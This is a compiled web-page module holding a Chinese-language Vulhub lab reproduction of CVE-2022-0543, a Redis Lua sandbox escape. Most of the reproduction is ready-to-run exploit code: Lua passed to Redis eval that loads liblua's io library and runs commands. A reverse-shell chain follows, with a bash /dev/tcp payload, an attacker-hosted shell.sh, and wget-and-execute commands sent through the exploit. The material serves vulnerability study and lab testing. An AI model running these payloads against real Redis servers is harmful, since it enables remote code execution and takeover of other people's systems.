import{_ as o}from"./plugin-vue_export-helper-c27b6911.js";import{r as s,o as n,c as t,a as e,b as l,d as i,e as d}from"./app-58e4a7d6.js";const u={},r=e("h2",{id:"漏洞描述",tabindex:"-1"},[e("a",{class:"header-anchor",href:"#漏洞描述","aria-hidden":"true"},"#"),l(" 漏洞描述")],-1),c=e("p",null,"Redis是著名的开源Key-Value数据库，其具备在沙箱中执行Lua脚本的能力。",-1),p=e("p",null,[l("Debian以及Ubuntu发行版的源在打包Redis时，不慎在Lua沙箱中遗留了一个对象"),e("code",null,"package"),l("，攻击者可以利用这个对象提供的方法加载动态链接库liblua里的函数，进而逃逸沙箱执行任意命令。")],-1),b=e("p",null,"参考链接：",-1),h={href:"https://www.ubercomp.com/posts/2022-01-20_redis_on_debian_rce",target:"_blank",rel:"noopener noreferrer"},v={href:"https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1005787",target:"_blank",rel:"noopener noreferrer"},g=d(`<h2 id="环境搭建" tabindex="-1"><a class="header-anchor" href="#环境搭建" aria-hidden="true">#</a> 环境搭建</h2><p>Vulhub执行如下命令启动一个使用Ubuntu源安装的Redis 5.0.7服务器：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>docker-compose up -d
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>服务启动后，我们可以使用<code>redis-cli -h your-ip</code>连接这个redis服务器。</p><h2 id="漏洞复现" tabindex="-1"><a class="header-anchor" href="#漏洞复现" aria-hidden="true">#</a> 漏洞复现</h2><p>借助Lua沙箱中遗留的变量<code>package</code>的<code>loadlib</code>函数来加载动态链接库<code>/usr/lib/x86_64-linux-gnu/liblua5.1.so.0</code>里的导出函数<code>luaopen_io</code>。在Lua中执行这个导出函数，即可获得<code>io</code>库，再使用其执行命令：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>local io_l = package.loadlib(&quot;/usr/lib/x86_64-linux-gnu/liblua5.1.so.0&quot;, &quot;luaopen_io&quot;);
local io = io_l();
local f = io.popen(&quot;id&quot;, &quot;r&quot;);
local res = f:read(&quot;*a&quot;);
f:close();
return res
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>值得注意的是，不同环境下的liblua库路径不同，你需要指定一个正确的路径。在我们Vulhub环境（Ubuntu fiocal）中，这个路径是<code>/usr/lib/x86_64-linux-gnu/liblua5.1.so.0</code>。</p><p>连接redis，使用<code>eval</code>命令执行上述脚本：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>eval &#39;local io_l = package.loadlib(&quot;/usr/lib/x86_64-linux-gnu/liblua5.1.so.0&quot;, &quot;luaopen_io&quot;); local io = io_l(); local f = io.popen(&quot;id&quot;, &quot;r&quot;); local res = f:read(&quot;*a&quot;); f:close(); return res&#39; 0
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/image-20220412154207162.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><h3 id="反弹shell" tabindex="-1"><a class="header-anchor" href="#反弹shell" aria-hidden="true">#</a> 反弹shell</h3><p>直接bash反弹shell失败，尝试其他方法。</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>eval &#39;local io_l = package.loadlib(&quot;/usr/lib/x86_64-linux-gnu/liblua5.1.so.0&quot;, &quot;luaopen_io&quot;); local io = io_l(); local f = io.popen(&quot;bash -i &gt;&amp; /dev/tcp/your-ip/6666 0&gt;&amp;1&quot;, &quot;r&quot;); local res = f:read(&quot;*a&quot;); f:close(); return res&#39; 0
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>攻击端编写shell脚本并启动http服务器：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>echo &quot;bash -i &gt;&amp; /dev/tcp/your-ip/6666 0&gt;&amp;1&quot; &gt; shell.sh
python3环境下：python -m http.server 80
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><p>受控端执行以下两条命令即可反弹shell：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code># 上传shell.sh文件
wget your-ip/shell.sh

# 执行shell.sh文件
bash shell.sh
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>结合当前漏洞，连接redis，使用<code>eval</code>命令执行脚本：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code># 上传shell.sh文件
eval &#39;local io_l = package.loadlib(&quot;/usr/lib/x86_64-linux-gnu/liblua5.1.so.0&quot;, &quot;luaopen_io&quot;); local io = io_l(); local f = io.popen(&quot;wget your-ip/shell.sh&quot;, &quot;r&quot;); local res = f:read(&quot;*a&quot;); f:close(); return res&#39; 0

# 执行shell.sh文件
eval &#39;local io_l = package.loadlib(&quot;/usr/lib/x86_64-linux-gnu/liblua5.1.so.0&quot;, &quot;luaopen_io&quot;); local io = io_l(); local f = io.popen(&quot;bash shell.sh&quot;, &quot;r&quot;); local res = f:read(&quot;*a&quot;); f:close(); return res&#39; 0
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>攻击端监听666端口，成功接收反弹shell：</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/image-20220412154740423.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure>`,22);function _(m,x){const a=s("ExternalLinkIcon");return n(),t("div",null,[r,c,p,b,e("ul",null,[e("li",null,[e("a",h,[l("https://www.ubercomp.com/posts/2022-01-20_redis_on_debian_rce"),i(a)])]),e("li",null,[e("a",v,[l("https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1005787"),i(a)])])]),g])}const k=o(u,[["render",_],["__file","Redis Lua 沙盒绕过命令执行 CVE-2022-0543.html.vue"]]);export{k as default};
